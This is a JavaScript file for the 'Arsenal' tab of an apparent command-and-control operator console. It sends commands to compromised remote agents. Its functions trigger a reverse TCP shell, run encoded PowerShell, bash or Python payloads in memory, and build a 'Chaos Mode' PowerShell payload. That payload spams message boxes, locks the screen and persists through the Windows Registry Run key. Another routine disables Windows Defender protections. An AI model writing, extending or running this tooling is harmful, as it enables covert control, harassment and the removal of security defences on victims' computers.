// Arsenal Tab Logic

const arsenalState = {
    selectedAgentId: null
};

function initArsenal() {
    console.log('[Arsenal] Initializing...');

    // Attempt to sync selected agent from main state if possible
    // For now, we rely on the user selecting an agent in the Arsenal UI if we add a selector there
    // Or we use the global 'selectedAgentId' from renderer.js if accessible
}

// Function called by the HTML button
async function configureJitter() {
    console.log('[Arsenal] Configure Jitter clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent in the Agents/Terminal tab first!');
        return;
    }

    // Capture the target Agent ID for the save function
    window.jittertargetAgentId = agentId;

    // Show the modal
    document.getElementById('jitterModal').style.display = 'flex';
}

function closeJitterModal() {
    document.getElementById('jitterModal').style.display = 'none';
}

async function saveJitterConfig() {
    const jitterVal = parseFloat(document.getElementById('jitterInput').value);
    const agentId = window.jittertargetAgentId;

    if (isNaN(jitterVal) || jitterVal < 0 || jitterVal > 1.0) {
        showNotification('Error', 'Invalid Jitter value! Must be between 0.0 and 1.0');
        return;
    }

    closeJitterModal();
    console.log(`[Arsenal] Setting Jitter to ${jitterVal} for Agent ${agentId}`);

    try {
        await sendCommandToAgent(agentId, `set-jitter ${jitterVal}`);
        showNotification('Success', `Jitter update queued for ${agentId}`);
    } catch (error) {
        console.error('[Arsenal] Failed to set jitter:', error);
        showNotification('Error', `Failed to set jitter: ${error.message}`);
    }
}

// Function to launch interactive shell from Arsenal tab
function launchInteractiveShell() {
    console.log('[Arsenal] Launching Interactive Shell');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    // switchView is defined in renderer.js but accessible globally? 
    // Usually functions in renderer.js are not global unless explicitly attached to window.
    // We might need to trigger the tab click.
    const terminalTab = document.querySelector('.nav-item[data-view="terminal"]');
    if (terminalTab) terminalTab.click();

    // Trigger the burst mode toggle if it's off
    // Polling to ensure view is rendered and button exists
    let attempts = 0;
    const interval = setInterval(() => {
        const toggleBurstBtn = document.getElementById('toggleBurstMode');
        attempts++;

        console.log(`[Arsenal] Checking for Toggle Button (Attempt ${attempts})... Found:`, !!toggleBurstBtn);

        if (toggleBurstBtn) {
            clearInterval(interval);
            if (!toggleBurstBtn.classList.contains('active')) {
                console.log('[Arsenal] Auto-clicking Interactive Mode ON');
                toggleBurstBtn.click();
            } else {
                console.log('[Arsenal] Interactive Mode already ON');
            }
        }

        if (attempts > 10) {
            console.error('[Arsenal] Failed to find toggle button after view switch');
            clearInterval(interval);
        }
    }, 100);
}

// Helper to reuse the send command logic from renderer.js
// We might need to export sendCommand from renderer.js or duplicate small logic
async function sendCommandToAgent(agentId, cmd) {
    const { ipcRenderer } = require('electron');
    // Using axios directly as in renderer.js
    const axios = require('axios');
    const https = require('https');
    const httpsAgent = new https.Agent({ rejectUnauthorized: false });

    // Use correct endpoint: /api/agents/<agent_id>/command
    await axios.post(`${c2ServerURL}/api/agents/${agentId}/command`, {
        command: cmd
    }, {
        headers: { 'Authorization': `Bearer ${authToken}` },
        httpsAgent: httpsAgent
    });
}

// ==========================================
// Reverse TCP Logic
// ==========================================

function configureReverseTCP() {
    console.log('[Arsenal] Configure Reverse TCP clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    window.reverseTcpTargetId = agentId;
    document.getElementById('reverseTCPModal').style.display = 'flex';
}

function closeReverseTCPModal() {
    document.getElementById('reverseTCPModal').style.display = 'none';
}

async function startReverseTCP() {
    const ip = document.getElementById('tcpIpInput').value;
    const port = document.getElementById('tcpPortInput').value;
    const agentId = window.reverseTcpTargetId;

    if (!ip || !port) {
        showNotification('Error', 'Please provide both IP and Port');
        return;
    }

    closeReverseTCPModal();
    console.log(`[Arsenal] Starting Reverse TCP to ${ip}:${port} for Agent ${agentId}`);

    try {
        const cmd = `reverse-tcp ${ip} ${port}`;
        await sendCommandToAgent(agentId, cmd);
        showNotification('Success', `Reverse Shell Payload Sent!`);
    } catch (error) {
        console.error('[Arsenal] Failed to send reverse tcp:', error);
        showNotification('Error', `Failed: ${error.message}`);
    }
}

// ==========================================
// Fileless Execution Logic (Ghost Mode)
// ==========================================

function configureFilelessExec() {
    console.log('[Arsenal] Configure Fileless Exec clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    window.filelessTargetId = agentId;

    // --- Global Prevention (Stop browser opening files) ---
    window.addEventListener('dragover', (e) => e.preventDefault(), false);
    window.addEventListener('drop', (e) => e.preventDefault(), false);

    // Setup Drag & Drop Zone
    const dropZone = document.getElementById('dropZone');
    // For upload view, a click triggers file input
    dropZone.addEventListener('click', () => document.getElementById('fileInput').click());

    dropZone.ondragenter = (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.add('drag-active');
    };

    dropZone.ondragover = (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.add('drag-active');
    };

    dropZone.ondragleave = (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.remove('drag-active');
    };

    dropZone.ondrop = (e) => {
        e.preventDefault();
        e.stopPropagation();
        dropZone.classList.remove('drag-active');
        if (e.dataTransfer.files.length > 0) {
            handleFileDrop(e.dataTransfer.files[0]);
        }
    };

    // Handle File Input Change
    document.getElementById('fileInput').onchange = (e) => {
        if (e.target.files.length > 0) {
            handleFileDrop(e.target.files[0]);
        }
    };

    // Initialize UI State (Reset to Upload Tab)
    switchFilelessTab('upload');
    document.getElementById('filelessModal').style.display = 'flex';
}

function closeFilelessModal() {
    document.getElementById('filelessModal').style.display = 'none';
    document.getElementById('psScriptInput').value = ''; // Clear
}

// Tab Switching Logic
function switchFilelessTab(mode) {
    const tabUpload = document.getElementById('tabUpload');
    const tabManual = document.getElementById('tabManual');
    const viewUpload = document.getElementById('viewUpload');
    const viewManual = document.getElementById('viewManual');

    // Safety check if elements exist (in case HTML isn't updated simultaneously/yet)
    if (!tabUpload || !tabManual) return;

    if (mode === 'upload') {
        tabUpload.classList.add('active');
        tabUpload.style.background = '#444';
        tabUpload.style.color = 'white';

        tabManual.classList.remove('active');
        tabManual.style.background = '#222';
        tabManual.style.color = '#aaa';

        viewUpload.style.display = 'flex';
        viewManual.style.display = 'none';
    } else {
        tabManual.classList.add('active');
        tabManual.style.background = '#444';
        tabManual.style.color = 'white';

        tabUpload.classList.remove('active');
        tabUpload.style.background = '#222';
        tabUpload.style.color = '#aaa';

        viewManual.style.display = 'flex';
        viewUpload.style.display = 'none';
    }
}

function handleFileDrop(file) {
    if (!file.name.endsWith('.ps1') && !file.name.endsWith('.txt') && !file.name.endsWith('.sh') && !file.name.endsWith('.py')) {
        showNotification('Warning', 'File extension might not be supported');
    }

    const reader = new FileReader();
    reader.onload = (e) => {
        document.getElementById('psScriptInput').value = e.target.result;
        showNotification('Info', `Loaded script: ${file.name}`);
        // Optional: Auto-switch to manual tab to show content?
        // switchFilelessTab('manual');
    };
    reader.readAsText(file);
}

// Helper: UTF-16LE Base64 (for PowerShell)
function utf8_to_b64_utf16le(str) {
    const buf = new ArrayBuffer(str.length * 2);
    const bufView = new Uint16Array(buf);
    for (let i = 0, strLen = str.length; i < strLen; i++) {
        bufView[i] = str.charCodeAt(i);
    }
    let binary = '';
    const bytes = new Uint8Array(buf);
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
}

// Helper: Standard UTF-8 Base64 (for Bash/Python/Sh)
function utf8_to_b64(str) {
    return window.btoa(unescape(encodeURIComponent(str)));
}

async function startFilelessExec() {
    const script = document.getElementById('psScriptInput').value;
    const agentId = window.filelessTargetId;
    // Default to powershell if element missing (backward compat?), but we added it
    const shellElement = document.getElementById('shellTypeSelector');
    const shellType = shellElement ? shellElement.value : 'powershell';

    if (!script || script.trim() === '') {
        showNotification('Error', 'Script cannot be empty!');
        return;
    }

    closeFilelessModal();
    console.log(`[Arsenal] Starting Fileless Execution (${shellType}) for Agent ${agentId}`);

    try {
        let base64Payload = "";

        // Determine encoding based on shell type
        if (shellType === 'powershell') {
            base64Payload = utf8_to_b64_utf16le(script);
        } else {
            // Bash, Sh, Python use standard Base64
            base64Payload = utf8_to_b64(script);
        }

        // Send command: run-memory <SHELL> <BASE64>
        const cmd = `run-memory ${shellType} ${base64Payload}`;

        await sendCommandToAgent(agentId, cmd);
        showNotification('Success', `Payload Sent (${shellType})! 👻`);
    } catch (error) {
        console.error('[Arsenal] Failed to send payload:', error);
        showNotification('Error', `Failed: ${error.message}`);
    }
}

// ==========================================
// Chaos Mode Logic
// ==========================================

function configureChaos() {
    console.log('[Arsenal] Configure Chaos Mode clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    window.chaosTargetId = agentId;
    document.getElementById('chaosModal').style.display = 'flex';
}

function closeChaosModal() {
    document.getElementById('chaosModal').style.display = 'none';
}

async function triggerChaos() {
    const agentId = window.chaosTargetId;
    const isPersist = document.getElementById('chaosPersist').checked;

    // Feature Checks
    const doAlert = document.getElementById('chaosAlert').checked;
    const doSpam = document.getElementById('chaosSpam').checked;
    const doUrl = document.getElementById('chaosUrl').checked;
    const doBlock = document.getElementById('chaosBlock').checked;

    // Inputs
    const alertMsg = document.getElementById('chaosAlertMsg').value || "You have been hacked!";
    const spamCount = document.getElementById('chaosSpamCount').value || 50;
    const urlLink = document.getElementById('chaosUrlLink').value || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    let payloadParts = [];

    // --- 1. Payload Construction ---

    // Alert
    if (doAlert) {
        // System Modal MessageBox (Blocks interaction until clicked)
        // using ServiceNotification (0x200000) to ensure it pops up on top of everything
        payloadParts.push(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('${alertMsg}','System Error',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error,[System.Windows.Forms.MessageBoxDefaultButton]::Button1,[System.Windows.Forms.MessageBoxOptions]::ServiceNotification)`);
    }

    // URL
    if (doUrl) {
        payloadParts.push(`Start-Process '${urlLink}'`);
    }

    // Spam (Infinite Loop / Count)
    if (doSpam) {
        // Let's spawn a separate process for the spam so we can kill it later by looking for the CommandLine tag #RAMP_SPAM
        // We escape the command carefully.
        const spamCmd = `for($i=0; $i -lt ${spamCount}; $i++){ [System.Windows.MessageBox]::Show('${alertMsg}','warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning); Start-Sleep -Milliseconds 200 }`;
        payloadParts.push(`Start-Process powershell.exe -ArgumentList '-WindowStyle','Hidden','-Command',"${spamCmd} ; #RAMP_SPAM"`);
    }

    // Block Screen
    if (doBlock) {
        // Overlay Form with specific title RAMP_BLOCK_SCREEN
        const blockScript = `
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.Text = 'RAMP_BLOCK_SCREEN'
        $form.TopMost = $true
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.BackColor = 'Black'
        $lbl = New-Object System.Windows.Forms.Label
        $lbl.Text = 'SYSTEM LOCKDOWN - CONTACT ADMINISTRATOR'
        $lbl.ForeColor = 'Red'
        $lbl.Font = New-Object System.Drawing.Font('Consolas', 24)
        $lbl.AutoSize = $true
        $lbl.Location = New-Object System.Drawing.Point(100, 100)
        $form.Controls.Add($lbl)
        $form.ShowDialog()
        `;
        // Run in separate process so main agent doesn't hang
        // We encode the block script to avoid quoting hell (and make it easier to nest)
        // Since we are inside JS, we use our JS helper to init the encoded string
        // But we can't call utf8_to_b64_utf16le synchronously inside the string template build so easily if it wasn't available.
        // Thankfully we are in JS.

        // However, we are building a string to be executed by the agent later.
        // We can pre-encode the block script HERE in JS.
        const encodedBlock = utf8_to_b64_utf16le(blockScript);
        payloadParts.push(`Start-Process powershell.exe -ArgumentList '-WindowStyle','Hidden','-EncodedCommand','${encodedBlock}'`);
    }

    if (payloadParts.length === 0) {
        showNotification('Warning', 'No chaos features selected!');
        return;
    }

    let finalScript = payloadParts.join(' ; ');

    // --- 2. Persistence Logic ---
    if (isPersist) {
        console.log('[Arsenal] Adding Persistence to Payload...');
        // We want to persist the *Action*, not just run it once.
        // So we take the finalScript, encode it, and set it as the value of the Registry Run key.
        const encodedFinal = utf8_to_b64_utf16le(finalScript);
        const persistCmd = `
        $path = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $name = "RAMP_CHAOS"
        $val = "powershell.exe -WindowStyle Hidden -EncodedCommand ${encodedFinal}"
        New-ItemProperty -Path $path -Name $name -Value $val -Force
        `;
        // We append the persistence set-up to the script being run NOW. 
        // So it runs the chaos NOW, AND sets it up for later.
        finalScript = finalScript + " ; " + persistCmd;
    }

    closeChaosModal();

    // --- 3. Execution ---
    try {
        // Always use PowerShell for Chaos Mode (Windows specific features)
        const encodedPayload = utf8_to_b64_utf16le(finalScript);
        const cmd = `run-memory powershell ${encodedPayload}`;

        await sendCommandToAgent(agentId, cmd);
        showNotification('Success', '🔥 Chaos Unleashed!');
    } catch (error) {
        console.error('[Arsenal] Chaos config failed:', error);
        showNotification('Error', 'Failed to execute chaos');
    }
}

async function stopChaosSpam() {
    const agentId = window.chaosTargetId;
    if (!agentId) return;

    // Kill processes with #RAMP_SPAM in command line
    // Note: Get-WmiObject is slow but reliable for command line args.
    const script = `Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*#RAMP_SPAM*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }`;

    try {
        const encoded = utf8_to_b64_utf16le(script);
        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
        showNotification('Success', 'Stopping Spam processes...');
    } catch (e) { showNotification('Error', e.message); }
}

async function stopChaosBlock() {
    const agentId = window.chaosTargetId;
    if (!agentId) return;

    // Kill process with WindowTitle 'RAMP_BLOCK_SCREEN'
    const script = `Get-Process | Where-Object { $_.MainWindowTitle -eq 'RAMP_BLOCK_SCREEN' } | Stop-Process -Force`;

    try {
        const encoded = utf8_to_b64_utf16le(script);
        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
        showNotification('Success', 'Unlocking Screen...');
    } catch (e) { showNotification('Error', e.message); }
}

async function removePersistence() {
    const agentId = window.chaosTargetId;
    if (!agentId) return;

    const script = `Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "RAMP_CHAOS" -ErrorAction SilentlyContinue`;

    try {
        const encoded = utf8_to_b64_utf16le(script);
        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
        showNotification('Success', 'Registry cleaned.');
    } catch (e) { showNotification('Error', e.message); }
}

// ==========================================
// Disable AV Logic (Admin Required)
// ==========================================

function configureDisableAV() {
    console.log('[Arsenal] Configure Disable AV clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    window.disableAVTargetId = agentId;
    document.getElementById('disableAVModal').style.display = 'flex';
}

function closeDisableAVModal() {
    document.getElementById('disableAVModal').style.display = 'none';
}

async function triggerDisableAV() {
    const agentId = window.disableAVTargetId;
    closeDisableAVModal();

    console.log(`[Arsenal] Disabling AV for Agent ${agentId} (Hope we have Admin!)`);

    // PowerShell payload to disable Real-time Monitoring and Cloud Protection
    // Note: This trigger requires High Integrity (Admin)
    const psScript = `
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableCloudProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    Write-Output "Defender should be disabled if Admin."
    `;

    try {
        const encoded = utf8_to_b64_utf16le(psScript);
        const cmd = `run-memory powershell ${encoded}`;

        await sendCommandToAgent(agentId, cmd);
        showNotification('Success', 'Disable AV Command Sent! 🛡️💀');
    } catch (error) {
        console.error('[Arsenal] Failed to disable AV:', error);
        showNotification('Error', `Failed: ${error.message}`);
    }
}
